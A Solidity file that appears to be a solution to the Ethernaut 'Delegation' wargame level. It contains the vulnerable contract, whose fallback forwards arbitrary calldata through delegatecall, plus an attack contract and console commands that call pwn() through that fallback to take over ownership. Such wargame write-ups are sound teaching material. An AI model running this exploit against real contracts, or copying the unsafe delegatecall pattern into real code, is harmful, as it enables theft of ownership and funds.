// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {

    // **VULNERABLE PORTION**
    // unsafe delegatecall!!
    // you allowed the attacker to call this pwn() function which changes the owner of the contract to itself via 
    // delegatecall.
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract attackDelegation {
    address public owner;
    Delegate delegate;

    address public delegation;

    constructor(address _delegation) public {
        delegation = _delegation;
    }

    function attack() public {
        delegation.call(abi.encodeWithSignature("pwn()"));
    }
    // this is one way of attacking the vulnerable contract
    // but if you wanna do it from the console, you can run the follow statements on the console to clear the stage
    // might be easier than creating a contract to launch an attack

    // ##### HERE #####
    // await contract.owner() //checks current owner - ethernaut address
    // //gets hash of the function to be called
    // var pwnSignature = web3.utils.sha3("pwn()") 
    // contract.sendTransaction({data: pwnSignature})//invokes fallback
    // await contract.owner() //checks current owner which is your address
}